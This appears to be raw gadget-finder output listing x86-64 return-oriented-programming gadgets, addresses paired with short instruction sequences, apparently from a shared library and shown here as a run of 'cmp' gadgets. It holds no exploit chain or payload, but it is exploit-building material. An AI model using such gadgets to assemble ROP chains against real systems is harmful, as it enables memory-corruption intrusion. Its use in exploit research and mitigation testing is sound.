0x00002aaaaaadaea8 : cmp al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaaaf5be5 : cmp al, byte ptr [rax] ; add rax, qword ptr fs:[0] ; ret
0x00002aaaaaaf6225 : cmp al, byte ptr [rax] ; mov dword ptr fs:[rax], 9 ; mov eax, edi ; ret
0x00002aaaaaaf492c : cmp al, byte ptr [rax] ; pop rax ; pop rbx ; pop rbp ; ret
0x00002aaaaaaf53de : cmp al, byte ptr [rax] ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaaf6a45 : cmp al, byte ptr [rax] ; ret
0x00002aaaaabb274c : cmp al, byte ptr [rbx - 0x7cb7fe3d] ; ret 0x4104
0x00002aaaaac6ce1d : cmp al, byte ptr [rcx] ; add byte ptr [rsp - 0xd], dl ; jmp rsp
0x00002aaaaabc50c9 : cmp al, byte ptr [rdi + rcx] ; test byte ptr [rbx - 0x76000004], ah ; ret 0xdb31
0x00002aaaaac46706 : cmp al, byte ptr [rsi - 1] ; jne 0x17172c ; xor eax, eax ; ret
0x00002aaaaac465ae : cmp al, byte ptr [rsi - 1] ; jne 0x171730 ; xor eax, eax ; ret
0x00002aaaaab08504 : cmp al, ch ; xchg eax, esi ; ret
0x00002aaaaac4671f : cmp al, cl ; jne 0x171730 ; cmp eax, ecx ; sbb eax, eax ; sbb eax, -1 ; ret
0x00002aaaaab62f76 : cmp al, dh ; ret
0x00002aaaaab62f75 : cmp al, r14b ; ret
0x00002aaaaab09f16 : cmp bh, 0xff ; inc eax ; shr eax, 0x1f ; ret
0x00002aaaaac831a8 : cmp bh, ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6a021 : cmp bh, ah ; jmp qword ptr [rax + 0x20fffc3b]
0x00002aaaaabe4f6a : cmp bh, al ; mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaac692d1 : cmp bh, bl ; jmp qword ptr [rax]
0x00002aaaaabe4fa2 : cmp bh, cl ; cmovne eax, esi ; ret
0x00002aaaaac69375 : cmp bl, 0xff ; and byte ptr [rdx - 0x7c5f0005], al ; sti ; jmp qword ptr [rax]
0x00002aaaaac6930d : cmp bl, bh ; call qword ptr [rax - 0x1f0004a4]
0x00002aaaaabe6fa8 : cmp bl, ch ; ret
0x00002aaaaab37808 : cmp bl, ch ; ret 0x8148
0x00002aaaaab34b89 : cmp bl, ch ; ret 0x858b
0x00002aaaaab69123 : cmp bl, dh ; ret
0x00002aaaaac05e53 : cmp bpl, byte ptr [r9] ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00002aaaaab80096 : cmp byte ptr [r11], r15b ; cmp byte ptr [rbp + 0x13], r14b ; ret
0x00002aaaaabe4e88 : cmp byte ptr [r8 - 0x75], cl ; push rbx ; and byte ptr [rax + 0x2b], cl ; xor r9b, bpl ; ret
0x00002aaaaab48d1b : cmp byte ptr [r8 - 0x77], cl ; ret 0x2b48
0x00002aaaaabbbfd9 : cmp byte ptr [r8], cl ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe3b89 : cmp byte ptr [r8], r9b ; je 0x10ebb3 ; mov rdx, r8 ; jmp 0x10eba3
0x00002aaaaab2082a : cmp byte ptr [rax + 0x39], cl ; ret
0x00002aaaaabc6bce : cmp byte ptr [rax + 0x39], cl ; ret 0x860f
0x00002aaaaab63baf : cmp byte ptr [rax + 0xf], cl ; ret
0x00002aaaaaaf9ffa : cmp byte ptr [rax + 0xf], cl ; ret 0x8949
0x00002aaaaac09ce6 : cmp byte ptr [rax + 1], bh ; ret
0x00002aaaaab62fb7 : cmp byte ptr [rax + 1], cl ; clc ; ret
0x00002aaaaab902c7 : cmp byte ptr [rax + 1], cl ; ret 0x6348
0x00002aaaaab584d4 : cmp byte ptr [rax + 8], 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x1bf
0x00002aaaaac08eca : cmp byte ptr [rax + rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaac25d66 : cmp byte ptr [rax + rax], al ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabae6b7 : cmp byte ptr [rax - 0x75], cl ; adc byte ptr [rax + 0x39], cl ; ret
0x00002aaaaaafaf32 : cmp byte ptr [rax - 0x75], cl ; and al, 0x18 ; call rax
0x00002aaaaaafb861 : cmp byte ptr [rax - 0x75], cl ; je 0x26895 ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x00002aaaaabadd51 : cmp byte ptr [rax - 0x75], cl ; or byte ptr [r9 + 0x63], r9b ; ret 0x4c6
0x00002aaaaabe4e89 : cmp byte ptr [rax - 0x75], cl ; push rbx ; and byte ptr [rax + 0x2b], cl ; xor r9b, bpl ; ret
0x00002aaaaabadd50 : cmp byte ptr [rax - 0x75], r9b ; or byte ptr [r9 + 0x63], r9b ; ret 0x4c6
0x00002aaaaab085d7 : cmp byte ptr [rax - 0x77], cl ; and al, 0x28 ; call 0x1f8a8
0x00002aaaaabd7154 : cmp byte ptr [rax - 0x77], cl ; and al, 8 ; call rbx
0x00002aaaaabbdb3b : cmp byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab48d1c : cmp byte ptr [rax - 0x77], cl ; ret 0x2b48
0x00002aaaaabe684f : cmp byte ptr [rax - 0x77], cl ; ret 0x2b49
0x00002aaaaabc8636 : cmp byte ptr [rax - 0x77], cl ; ret 0x69e9
0x00002aaaaabc4c40 : cmp byte ptr [rax - 0x77], cl ; ret 0x8b44
0x00002aaaaab1f76f : cmp byte ptr [rax - 0x77], cl ; xlatb ; mov byte ptr [rsi], al ; jne 0x4a75b ; mov rax, rsi ; ret
0x00002aaaaac00630 : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp + rax + 0x48], 0x89 ; out dx, eax ; call rax
0x00002aaaaac0224e : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp + rax + 0x48], cl ; mov edi, ebp ; call rdx
0x00002aaaaac08511 : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp + rax + 0x4c], 0x89 ; out dx, eax ; call rax
0x00002aaaaac07237 : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jge 0x13225b ; call rax
0x00002aaaaac07236 : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jge 0x13225c ; call rax
0x00002aaaaac0d3b7 : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jge 0x1383db ; call rax
0x00002aaaaac0d3b6 : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jge 0x1383dc ; call rax
0x00002aaaaac0dad0 : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jge 0x138af4 ; call rax
0x00002aaaaac0dacf : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jge 0x138af5 ; call rax
0x00002aaaaac0941b : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jnp 0x134497 ; call rax
0x00002aaaaac0941a : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jnp 0x134498 ; call rax
0x00002aaaaac09e3b : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jnp 0x134ea7 ; call rax
0x00002aaaaac09e3a : cmp byte ptr [rax - 0x7b], cl ; sal byte ptr [rsi + rax + 0x48], 0x8d ; jnp 0x134ea8 ; call rax
0x00002aaaaab338b6 : cmp byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabfce7f : cmp byte ptr [rax - 1], 0x5b ; pop rbp ; pop r12 ; ret
0x00002aaaaabd3612 : cmp byte ptr [rax - 1], bh ; ret
0x00002aaaaac41018 : cmp byte ptr [rax], 1 ; sbb rax, -1 ; ret
0x00002aaaaab62fa6 : cmp byte ptr [rax], ah ; ret
0x00002aaaaabb353a : cmp byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ret
0x00002aaaaab0f898 : cmp byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; mov eax, dword ptr [rax + 0x58] ; ret
0x00002aaaaab100e5 : cmp byte ptr [rax], al ; add rsp, 8 ; ret
0x00002aaaaac697d0 : cmp byte ptr [rax], al ; cld ; inc dword ptr [rax] ; add bh, ah ; jmp rax
0x00002aaaaac1eaaa : cmp byte ptr [rax], al ; enter 0xf66, 0x3a ; movsxd rcx, ecx ; cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaac1ebce : cmp byte ptr [rax], al ; fldenv dword ptr [rsi + 0xf] ; cmp ah, byte ptr [rbx - 0x25] ; cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaab50563 : cmp byte ptr [rax], al ; je 0x7b574 ; ret
0x00002aaaaab0b8bf : cmp byte ptr [rax], al ; mov eax, edx ; ret
0x00002aaaaab0a775 : cmp byte ptr [rax], al ; neg eax ; mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x00002aaaaab0b874 : cmp byte ptr [rax], al ; ret
0x00002aaaaabe387f : cmp byte ptr [rax], bh ; je 0x10e8ae ; mov rdx, rax ; jmp 0x10e89b
0x00002aaaaac0d2d9 : cmp byte ptr [rax], bl ; je 0x1382e4 ; ret
0x00002aaaaabe3b8a : cmp byte ptr [rax], cl ; je 0x10ebb2 ; mov rdx, r8 ; jmp 0x10eba2
0x00002aaaaabbbfda : cmp byte ptr [rax], cl ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab5df50 : cmp byte ptr [rax], dh ; cmovne rax, rdx ; ret
0x00002aaaaab73556 : cmp byte ptr [rax], dh ; ret
0x00002aaaaabe387e : cmp byte ptr [rax], dil ; je 0x10e8af ; mov rdx, rax ; jmp 0x10e89c
0x00002aaaaab62f96 : cmp byte ptr [rax], dl ; ret
0x00002aaaaab62f95 : cmp byte ptr [rax], r10b ; ret
0x00002aaaaab62fa5 : cmp byte ptr [rax], r12b ; ret
0x00002aaaaab73555 : cmp byte ptr [rax], r14b ; ret
0x00002aaaaab5df4f : cmp byte ptr [rax], sil ; cmovne rax, rdx ; ret
0x00002aaaaab8009a : cmp byte ptr [rbp + 0x13], dh ; ret
0x00002aaaaab80099 : cmp byte ptr [rbp + 0x13], r14b ; ret
0x00002aaaaabe3880 : cmp byte ptr [rbp + 0x48], dh ; mov edx, eax ; jmp 0x10e89a
0x00002aaaaac17a9a : cmp byte ptr [rbp - 0x25], dh ; add rsp, 0x48 ; ret
0x00002aaaaabda3de : cmp byte ptr [rbp - 0x3dbbf040], al ; ret
0x00002aaaaabacd28 : cmp byte ptr [rbp - 0x7cb7febd], cl ; ret
0x00002aaaaabd6404 : cmp byte ptr [rbp - 0xb], al ; lcall ptr [rax + 0x48] ; mov eax, ebx ; pop rdx ; pop rbx ; ret
0x00002aaaaac84c38 : cmp byte ptr [rbp - 0xb], ch ; call qword ptr [rax]
0x00002aaaaac5d560 : cmp byte ptr [rbp - 0xc], cl ; inc eax ; hlt ; inc eax ; hlt ; jmp rax
0x00002aaaaab01b29 : cmp byte ptr [rbx + 0x13], dh ; mov rax, qword ptr [rdx + rdi*8 + 0x40] ; ret
0x00002aaaaac8e734 : cmp byte ptr [rbx + 0x400e4f07], al ; push 0x41380e0a ; ret
0x00002aaaaaafef9a : cmp byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaaba24ea : cmp byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab1c054 : cmp byte ptr [rbx + 1], 0 ; jne 0x4705a ; mov rax, rbx ; pop rbx ; ret
0x00002aaaaab2f7b0 : cmp byte ptr [rbx + rcx*4 - 0x63], cl ; sub bh, 0xff ; dec dword ptr [rcx + 0x39] ; ret
0x00002aaaaac7f9e4 : cmp byte ptr [rbx - 0x5ff1aef9], al ; adc al, byte ptr [rbx] ; ret 0xa02
0x00002aaaaac88008 : cmp byte ptr [rbx - 0xa], cl ; call qword ptr [rax]
0x00002aaaaac5d990 : cmp byte ptr [rbx - 0xc], dl ; inc eax ; push rdx ; hlt ; inc eax ; push rdx ; hlt ; jmp rax
0x00002aaaaab80097 : cmp byte ptr [rbx], bh ; cmp byte ptr [rbp + 0x13], r14b ; ret
0x00002aaaaab47ad7 : cmp byte ptr [rcx + 0x5d5b7453], cl ; pop r12 ; ret
0x00002aaaaab92899 : cmp byte ptr [rcx + 1], cl ; ret
0x00002aaaaabac0c5 : cmp byte ptr [rcx + 8], 2 ; jne 0xd70a7 ; jmp 0xd7097
0x00002aaaaab86203 : cmp byte ptr [rcx - 0x17d7dbb4], cl ; ret
0x00002aaaaabd2166 : cmp byte ptr [rcx - 0x3b7cb730], cl ; ret
0x00002aaaaabbfd4c : cmp byte ptr [rcx - 0x75], cl ; or byte ptr [r8 - 0x77], r9b ; ret 0x8948
0x00002aaaaab15195 : cmp byte ptr [rcx - 0x77], al ; ret 0x8d48
0x00002aaaaac837a5 : cmp byte ptr [rcx], al ; add al, bl ; std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac837bd : cmp byte ptr [rcx], al ; add al, dh ; std ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac41019 : cmp byte ptr [rcx], al ; sbb rax, -1 ; ret
0x00002aaaaab7c154 : cmp byte ptr [rcx], cl ; add byte ptr [rax], al ; ret
0x00002aaaaab09ba7 : cmp byte ptr [rdi + 0x2d], 0 ; add byte ptr [rax + 0x1fe8c17f], al ; ret
0x00002aaaaabab64c : cmp byte ptr [rdi + 0x65], 1 ; sbb eax, eax ; not eax ; and eax, 2 ; ret
0x00002aaaaac7c648 : cmp byte ptr [rdi - 0x10], al ; jmp qword ptr [rdi]
0x00002aaaaaad7054 : cmp byte ptr [rdi - 0x19ade7f3], dl ; ret
0x00002aaaaac84e58 : cmp byte ptr [rdi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaab0f6c8 : cmp byte ptr [rdi], 0 ; jne 0x3a6d6 ; pop rbx ; ret
0x00002aaaaaba3956 : cmp byte ptr [rdi], 0 ; mov r12, rdi ; je 0xce97d ; call 0x8ab7a
0x00002aaaaac87a80 : cmp byte ptr [rdi], 0xf6 ; call qword ptr [rbx]
0x00002aaaaab6d9a7 : cmp byte ptr [rdi], cl ; mov dh, 0x55 ; ret 0x8349
0x00002aaaaab50528 : cmp byte ptr [rdi], cl ; ret 0x389
0x00002aaaaabb09e8 : cmp byte ptr [rdi], cl ; test cl, cl ; add dword ptr [rax], eax ; add dh, dh ; ret
0x00002aaaaac432ed : cmp byte ptr [rdi], dl ; ret
0x00002aaaaac43e00 : cmp byte ptr [rdi], dl ; ret 0x2373
0x00002aaaaac43de9 : cmp byte ptr [rdi], dl ; ret 0x3a73
0x00002aaaaac43dd2 : cmp byte ptr [rdi], dl ; ret 0x5173
0x00002aaaaac4288e : cmp byte ptr [rdi], dl ; ret 0x830f
0x00002aaaaac6f59d : cmp byte ptr [rdx], al ; add ah, dh ; cli ; jmp rsp
0x00002aaaaab4690f : cmp byte ptr [rdx], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaac7f608 : cmp byte ptr [rdx], ch ; jmp qword ptr [rdi]
0x00002aaaaac84d38 : cmp byte ptr [rsi - 0xb], ch ; jmp qword ptr [rcx]
0x00002aaaaaba1f28 : cmp byte ptr [rsi], ah ; mov eax, 0x20 ; cmovne rax, rdx ; ret
0x00002aaaaaba1df8 : cmp byte ptr [rsi], ah ; mov eax, 0x7f ; cmovne rax, rdx ; ret
0x00002aaaaac83d18 : cmp byte ptr [rsi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac17bb3 : cmp byte ptr [rsp + 0x1f], 0 ; jne 0x142bdb ; add rsp, 0x38 ; ret
0x00002aaaaabd5d9b : cmp ch, byte ptr [rax + rax] ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac05e54 : cmp ch, byte ptr [rcx] ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00002aaaaac1eab2 : cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaac71bf9 : cmp ch, cl ; call qword ptr [rax]
0x00002aaaaac71c29 : cmp ch, cl ; call qword ptr [rsi]
0x00002aaaaabb5410 : cmp cl, 0x11 ; je 0xe0452 ; mov rdx, rax ; jmp 0xe03b6
0x00002aaaaab90088 : cmp cl, al ; call 0xffffffff89cdd9b3
0x00002aaaaac1ea75 : cmp cl, byte ptr [rax + 0x63] ; leave ; lea rax, qword ptr [rdi + rcx] ; sub rax, r8 ; ret
0x00002aaaaab554c6 : cmp cl, byte ptr [rax - 0x77] ; ret 0x8948
0x00002aaaaabaefcf : cmp cl, byte ptr [rax - 0x7d] ; ret
0x00002aaaaac080a7 : cmp cl, byte ptr [rax - 0x7d] ; ret 0x8d04
0x00002aaaaabcf0d1 : cmp cl, byte ptr [rcx] ; add byte ptr [rcx], dh ; sal byte ptr [rcx], cl ; div byte ptr [rcx] ; shr al, 0x71 ; ret
0x00002aaaaabe2262 : cmp cl, byte ptr [rdi] ; ret 0xc084
0x00002aaaaabff013 : cmp cl, byte ptr [rdi] ; xchg eax, ebp ; ret 0x8041
0x00002aaaaab1c27c : cmp cl, byte ptr [rdi] ; xchg eax, esp ; ret
0x00002aaaaabab71e : cmp cl, byte ptr [rsi] ; je 0xd66bb ; pop rbx ; ret
0x00002aaaaab11a26 : cmp cl, ch ; ret
0x00002aaaaabb4308 : cmp cl, ch ; ret 0xfffe
0x00002aaaaabad25b : cmp dh, 0x3f ; ja 0xd827a ; mov eax, 2 ; ret
0x00002aaaaabe4fe3 : cmp dh, al ; mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaac83838 : cmp dh, bh ; hlt ; jmp rdi
0x00002aaaaab0f6c5 : cmp dh, byte ptr [rcx] ; rol byte ptr [rax + 0x375003f], 0x5b ; ret
0x00002aaaaab756e5 : cmp dh, dh ; ret 0x7501
0x00002aaaaabe500f : cmp dh, dl ; cmovne eax, ecx ; ret
0x00002aaaaabe4f69 : cmp dil, al ; mov eax, edx ; cmove eax, ecx ; ret
0x00002aaaaac692d0 : cmp dil, bl ; jmp qword ptr [rax]
0x00002aaaaabe4fa1 : cmp dil, cl ; cmovne eax, esi ; ret
0x00002aaaaabd372f : cmp dl, 0x20 ; je 0xfe72a ; mov byte ptr [r8 - 1], 0 ; ret
0x00002aaaaaba5a55 : cmp dl, 0x3f ; jne 0xd0a20 ; mov eax, 1 ; ret
0x00002aaaaaba5a65 : cmp dl, 0x3f ; jne 0xd0a36 ; mov eax, 1 ; ret
0x00002aaaaab4c898 : cmp dl, 0xff ; xor eax, eax ; pop rbx ; ret
0x00002aaaaac46e90 : cmp dl, 1 ; jb 0x171e9e ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab7400b : cmp dl, 1 ; jb 0x9f01d ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab7475e : cmp dl, 1 ; jb 0x9f770 ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab74eab : cmp dl, 1 ; jb 0x9febd ; mov cl, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab7ea5a : cmp dl, 1 ; jb 0xa9a68 ; mov byte ptr [rdi], cl ; ret
0x00002aaaaab5f862 : cmp dl, 3 ; je 0x8a88f ; movsx eax, dl ; ret
0x00002aaaaab5f862 : cmp dl, 3 ; je 0x8a890 ; movsx eax, dl ; ret
0x00002aaaaab5f861 : cmp dl, 3 ; je 0x8a891 ; movsx eax, dl ; ret
0x00002aaaaac46e74 : cmp dl, 4 ; jb 0x171e8a ; mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x00002aaaaab7ea42 : cmp dl, 4 ; jb 0xa9a57 ; mov dword ptr [rdi], ecx ; mov dword ptr [rsi - 4], ecx ; ret
0x00002aaaaac82f38 : cmp dl, ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac81208 : cmp dl, bl ; jmp qword ptr [rcx]
0x00002aaaaaad7b86 : cmp dl, byte ptr [rdi] ; ret
0x00002aaaaab47aa8 : cmp dword ptr [rax + 0x30], 0 ; je 0x72ab6 ; ret
0x00002aaaaac25c16 : cmp dword ptr [rax + rax], eax ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac0684e : cmp dword ptr [rax - 0x48000000], 1 ; ret
0x00002aaaaab714f3 : cmp dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaac18553 : cmp dword ptr [rax - 8], eax ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac0d2d8 : cmp dword ptr [rax], 0x18 ; je 0x1382e5 ; ret
0x00002aaaaab4d418 : cmp dword ptr [rax], 0x1d ; je 0x783c4 ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaaba1f27 : cmp dword ptr [rax], 0x26 ; mov eax, 0x20 ; cmovne rax, rdx ; ret
0x00002aaaaaba1df7 : cmp dword ptr [rax], 0x26 ; mov eax, 0x7f ; cmovne rax, rdx ; ret
0x00002aaaaab030f5 : cmp dword ptr [rax], eax ; add rax, qword ptr fs:[0] ; ret
0x00002aaaaab01ae6 : cmp dword ptr [rax], eax ; mov byte ptr [rip + 0x397faf], dl ; ret
0x00002aaaaab029d0 : cmp dword ptr [rax], eax ; mov qword ptr [rax], rdx ; ret
0x00002aaaaab03199 : cmp dword ptr [rax], eax ; mov qword ptr fs:[rdx], rax ; ret
0x00002aaaaaafec95 : cmp dword ptr [rax], eax ; ret
0x00002aaaaab0a304 : cmp dword ptr [rax], eax ; test eax, eax ; jne 0x35317 ; ret
0x00002aaaaaba9fb2 : cmp dword ptr [rbx + 0xa4], 1 ; setg dl ; jmp 0xd4f49
0x00002aaaaac2ecd8 : cmp dword ptr [rbx - 1], -1 ; dec dword ptr [rax - 0x7f] ; ret 0x80
0x00002aaaaabf4f33 : cmp dword ptr [rcx + 0x2a], ecx ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00002aaaaab6986e : cmp dword ptr [rcx + 0x39], ecx ; ret
0x00002aaaaab0d1ec : cmp dword ptr [rcx - 0x7d], ecx ; ret 0xf301
0x00002aaaaac83915 : cmp dword ptr [rcx], eax ; add byte ptr [rax], bl ; add esi, ebp ; call qword ptr [rdi]
0x00002aaaaac8384d : cmp dword ptr [rcx], eax ; add byte ptr [rax], dl ; push rsp ; call rsi
0x00002aaaaabfc7ad : cmp dword ptr [rdi + 0x10], 2 ; je 0x1277be ; ret
0x00002aaaaab4c3e4 : cmp dword ptr [rdi + 0x18], 0 ; setne al ; ret
0x00002aaaaab50561 : cmp dword ptr [rdi + 0x38], 0 ; je 0x7b576 ; ret
0x00002aaaaab7ff3b : cmp dword ptr [rdi + 0xc], ecx ; jne 0xab0bb ; xor eax, eax ; ret
0x00002aaaaab8f670 : cmp dword ptr [rdi + 8], edx ; jne 0xba653 ; ret
0x00002aaaaabe8e58 : cmp dword ptr [rdi], 0 ; je 0x113e6e ; ret
0x00002aaaaac48679 : cmp dword ptr [rdi], 4 ; jle 0x17367b ; mov rbx, qword ptr [rdi + 0x10] ; call 0x1f8b3
0x00002aaaaabe9f6f : cmp dword ptr [rdx + rcx*8 - 8], 1 ; sbb eax, 0 ; leave ; ret
0x00002aaaaabbc8b1 : cmp dword ptr [rip + 0x2de5a8], 0 ; je 0xe78fb ; xor eax, eax ; ret
0x00002aaaaab5d371 : cmp dword ptr [rip + 0x33d4f0], 0 ; je 0x88389 ; ret
0x00002aaaaabb512b : cmp dword ptr [rip + 0x66000002], 0xf ; outsd dx, dword ptr [rsi] ; ret 0xddeb
0x00002aaaaac07bd0 : cmp dword ptr [rsi + 0x10], 0xc ; je 0x132be8 ; xor eax, eax ; ret
0x00002aaaaabb418f : cmp dword ptr [rsi + 0x6348000a], ebx ; add al, 0x90 ; add rax, rdi ; jmp rax
0x00002aaaaabd68fd : cmp dword ptr [rsi], 0 ; je 0x10190e ; pop rbx ; ret
0x00002aaaaac08620 : cmp dword ptr [rsi], 2 ; je 0x13363a ; mov eax, 1 ; ret
0x00002aaaaaad8836 : cmp dword ptr [rsi], ecx ; pop rsp ; ret
0x00002aaaaabcba93 : cmp dword ptr [rsp - 0x58], 2 ; cmove eax, edx ; ret
0x00002aaaaab6b0c0 : cmp dword ptr [rsp], 0 ; je 0x960db ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0d2d7 : cmp dword ptr fs:[rax], 0x18 ; je 0x1382e6 ; ret
0x00002aaaaaad8ba7 : cmp eax, 0x12c401fe ; mov cl, 0x22 ; xchg eax, ebp ; ret
0x00002aaaaab20512 : cmp eax, 0x1445f1 ; call 0x777f7
0x00002aaaaac83c65 : cmp eax, 0x1c480001 ; cmc ; call qword ptr [rdx]
0x00002aaaaac83d15 : cmp eax, 0x1e380001 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac83d2d : cmp eax, 0x1e500001 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac489c2 : cmp eax, 0x253789 ; cmp rdi, 1 ; ja 0x1739db ; ret
0x00002aaaaabf4b22 : cmp eax, 0x2a7bd5 ; call rax
0x00002aaaaabf42c3 : cmp eax, 0x2a83d8 ; call rax
0x00002aaaaabe97ac : cmp eax, 0x2b3f97 ; cmp rdx, rax ; jne 0x11479b ; ret
0x00002aaaaabd58bb : cmp eax, 0x2c2950 ; ret
0x00002aaaaaba2031 : cmp eax, 0x2f ; je 0xccffc ; mov eax, 1 ; ret
0x00002aaaaac6ce6d : cmp eax, 0x32b40001 ; jmp rsp
0x00002aaaaabe9966 : cmp eax, 0x3948002b ; ret 0x840f
0x00002aaaaac6a029 : cmp eax, 0x3ea0fffc ; cld ; jmp qword ptr [rax]
0x00002aaaaab92faf : cmp eax, 0x4a00307b ; lea ecx, dword ptr [rax] ; mov rdx, rax ; jmp 0xbdfca
0x00002aaaaabba69d : cmp eax, 0x6348000a ; adc al, 0x90 ; add rax, rdx ; jmp rax
0x00002aaaaac258ca : cmp eax, 0x63490004 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaabb512c : cmp eax, 0x66000002 ; movq mm0, mm2 ; jmp 0xe011a
0x00002aaaaac58241 : cmp eax, 0x7170d773 ; mov ebp, 0xfb67d10d ; ret
0x00002aaaaaba1feb : cmp eax, 0x7275 ; jne 0xccfd4 ; xor eax, eax ; ret
0x00002aaaaab4abdf : cmp eax, 0x89000056 ; ret 0x98eb
0x00002aaaaab6b7a6 : cmp eax, 0x89482e75 ; clc ; pop rbx ; ret
0x00002aaaaab9ce0a : cmp eax, 0x89e18948 ; ret 0xf631
0x00002aaaaab5f89f : cmp eax, 0xa ; mov eax, 0xffffffff ; cmovae eax, ecx ; ret
0x00002aaaaabcfe6d : cmp eax, 0xa1 ; je 0xfae90 ; neg eax ; pop rbx ; ret
0x00002aaaaab944fe : cmp eax, 0xc8571 ; add rax, rdi ; jmp rax
0x00002aaaaab9249a : cmp eax, 0xd00ef ; call 0x39777
0x00002aaaaabe9c13 : cmp eax, 0xea ; mov eax, 3 ; cmovne eax, edx ; ret
0x00002aaaaabf7410 : cmp eax, 0xf5 ; je 0x12240e ; pop rbx ; ret
0x00002aaaaac485cd : cmp eax, 0xfd ; ja 0x17359f ; call 0x1f8af
0x00002aaaaab8a93a : cmp eax, 0xff ; cmove eax, edx ; ret
0x00002aaaaab5bd1f : cmp eax, 0xff ; cmove rax, rdx ; add rsp, 8 ; ret
0x00002aaaaabdddc7 : cmp eax, 0xff ; je 0x108ddd ; add eax, 1 ; mov word ptr [rdx], ax ; ret
0x00002aaaaabde016 : cmp eax, 0xff ; je 0x10902a ; add eax, 1 ; mov dword ptr [rdx], eax ; ret
0x00002aaaaac16dae : cmp eax, 0xff ; je 0x141dc9 ; add rsp, 8 ; ret
0x00002aaaaab47cba : cmp eax, 0xff ; je 0x72ccb ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab47cfe : cmp eax, 0xff ; je 0x72d0f ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab502b0 : cmp eax, 0xff ; je 0x7b270 ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab50400 : cmp eax, 0xff ; je 0x7b3c0 ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab50594 : cmp eax, 0xff ; je 0x7b5a9 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab50f77 : cmp eax, 0xff ; je 0x7bf88 ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaabe9f80 : cmp eax, 0xff ; jne 0x114f7f ; xor eax, eax ; leave ; ret
0x00002aaaaab1d4c4 : cmp eax, 0xff ; jne 0x484b9 ; mov rax, rdx ; ret
0x00002aaaaab49699 : cmp eax, 0xff ; jne 0x746a6 ; pop rbx ; ret
0x00002aaaaab50fcf : cmp eax, 0xff ; jne 0x7bfc0 ; pop rbx ; ret
0x00002aaaaaba03c6 : cmp eax, 0xff ; mov edx, 0 ; cmove rax, rdx ; ret
